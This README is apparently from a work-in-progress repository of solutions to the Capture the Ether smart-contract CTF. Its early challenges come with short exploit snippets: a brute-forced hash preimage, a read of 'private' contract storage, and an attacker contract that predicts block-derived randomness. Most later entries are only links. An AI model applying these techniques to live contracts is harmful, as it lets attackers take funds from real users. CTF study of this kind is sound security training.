# Capture the Ether Solutions

Solutions to the Capture The Ether CTF challenges ⛳️

🚧 WIP

## Contents

- [Warmup](#warmup)
  - [Deploy a contract](#deploy-a-contract)
  - [Call me](#call-me)
  - [Choose a nickname](#choose-a-nickname)
- [Lotteries](#lotteries)
  - [Guess the number](#guess-the-number)
  - [Guess the secret number](#guess-the-secret-number)
  - [Guess the random number](#guess-the-random-number)
  - [Guess the new number](#guess-the-new-number)
  - [Predict the future](#predict-the-future)
  - [Predict the block hash](#predict-the-block-hash)
- [Math](#math)
  - [Token sale](#token-sale)
  - [Token whale](#token-whale)
  - [Retirement fund](#retirement-fund)
  - [Mapping](#mapping)
  - [Donation](#donation)
  - [Fifty years](#fifty-years)
- [Accounts](#accounts)
  - [Fuzzy identity](#fuzzy-identity)
  - [Public Key](#public-key)
  - [Account Takeover](#account-takeover)
- [Miscellaneous](#miscellaneous)
  - [Assume ownership](#assume-ownership)
  - [Token bank](#token-bank)

## Warmup

### Deploy a contract

1. Install a wallet
2. Get some ETH from a faucet
3. Deploy the contract from the web page

### Call me

Just call the `callme` function.

```typescript
const tx = await contract.callme();
```

[Script](./scripts/warmup/CallMeChallenge.ts) | [Test](./test/warmup/CallMeChallenge.spec.ts)

### Choose a nickname

Call the `setNickname` function with your nickname.

The function expects the input to be a `bytes32`, so you should parse the name before sending it.

```typescript
const nickname = ethers.utils.formatBytes32String("juancito");
const tx = await contract.setNickname(nickname);
```

[Script](./scripts/warmup/NicknameChallenge.ts)

## Lotteries

### Guess the number

Call the `guess` function with the `answer` number `42` which is hardcoded in the contract

```typescript
const tx = await contract.guess(42, { value: utils.parseEther("1") });
```

[Script](./scripts/lotteries/GuessTheNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNumberChallenge.spec.ts)

### Guess the secret number

The answer `n` is now a number that produces a specific `answerHash` which is not reversible

```solidity
bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

function guess(uint8 n) public payable {
    require(msg.value == 1 ether);

    if (keccak256(n) == answerHash) {
        msg.sender.transfer(2 ether);
    }
}
```

The good thing is that the answer is defined as `uint8 n`, which has a range from 0 to 255. We can brute force it until we get the specific hash.

```typescript
for (let i = 0; i <= 255; i++) {
  const hash = utils.keccak256([i]);
  if (answerHash === hash) {
    secretNumber = i;
    console.log(`The secret number is ${secretNumber}`);
    break;
  }
}
```

[Script](./scripts/lotteries/GuessTheSecretNumberChallenge.ts) | [Test](./test/lotteries/GuessTheSecretNumberChallenge.spec.ts)

### Guess the random number

In this case the answer is generated "randomly" and stored "privately" in the contract:

```solidity
contract GuessTheRandomNumberChallenge {
  uint8 answer;

  function GuessTheRandomNumberChallenge() public payable {
    answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  }
}

```

Data in smart contracts can be read despite being declared as "private". The key here is to understand how the storage works, and that the `answer` is stored in `slot 0` and therefore can be retrieved by calling:

```typescript
const secretNumber = await contract.provider.getStorageAt(contract.address, 0);
```

[Script](./scripts/lotteries/GuessTheRandomNumberChallenge.ts) | [Test](./test/lotteries/GuessTheRandomNumberChallenge.spec.ts)

### Guess the new number

The answer is now a "random" number:

```solidity
function guess(uint8 n) public payable {
  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

  if (n == answer) {
    msg.sender.transfer(2 ether);
  }
}

```

The EVM is deterministic, so it is not possible to achieve randomness inside it. Given the same inputs, it will output the same result, and we can explot this.

We can create a new contract that calculates the answer and calls the original contract with it. That way we can make sure that the "random" number is generated on the same block, and we can win every time.

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
challenge.guess.value(1 ether)(answer);
```

[Script](./scripts/lotteries/GuessTheNewNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNewNumberChallenge.spec.ts)

### Predict the future

[Script](./scripts/lotteries/PredictTheFutureChallenge.ts) | [Test](./test/lotteries/PredictTheFutureChallenge.spec.ts)

### Predict the block hash

[Script](./scripts/lotteries/PredictTheBlockHashChallenge.ts) | [Test](./test/lotteries/PredictTheBlockHashChallenge.spec.ts)

## Math

### Token sale

[Script](./scripts/math/TokenSaleChallenge.ts) | [Test](./test/math/TokenSaleChallenge.spec.ts)

### Token whale

[Script](./scripts/math/TokenWhaleChallenge.ts) | [Test](./test/math/TokenWhaleChallenge.spec.ts)

### Retirement fund

[Script](./scripts/math/RetirementFundChallenge.ts) | [Test](./test/math/RetirementFundChallenge.spec.ts)

### Mapping

[Script](./scripts/math/MappingChallenge.ts) | [Test](./test/math/MappingChallenge.spec.ts)

### Donation

[Script](./scripts/math/DonationChallenge.ts) | [Test](./test/math/DonationChallenge.spec.ts)

### Fifty years

[Script](./scripts/math/FiftyYearsChallenge.ts) | [Test](./test/math/FiftyYearsChallenge.spec.ts)

## Accounts

### Fuzzy identity

[Script](./scripts/accounts/FuzzyIdentityChallenge.ts) | [Test](./test/accounts/FuzzyIdentityChallenge.spec.ts)

### Public Key

[Script](./scripts/accounts/PublicKey.ts)

### Account Takeover

[Script](./scripts/accounts/AccountTakeoverChallenge.ts)

## Miscellaneous

### Assume ownership

[Script](./scripts/miscellaneous/AssumeOwnershipChallenge.ts) | [Test](./test/miscellaneous/AssumeOwnershipChallenge.spec.ts)

### Token bank

[Script](./scripts/miscellaneous/TokenBankChallenge.ts) | [Test](./test/miscellaneous/TokenBankChallenge.spec.ts)

# Acknowledgments

Some other helpful solutions that helped me understand better the challenges:

- https://cmichel.io/capture-the-ether-solutions/
- https://medium.com/coinmonks/lets-play-capture-the-ether-warmup-68a5fc38e670
- https://medium.com/coinmonks/smart-contract-exploits-part-2-featuring-capture-the-ether-math-31a289da0427
- https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347
- https://www.youtube.com/watch?v=c7Pnn-Oop_Q&list=PLQ6T91uQFBa3_4RxD63XfMyfmNX56XO74 (Spanish)
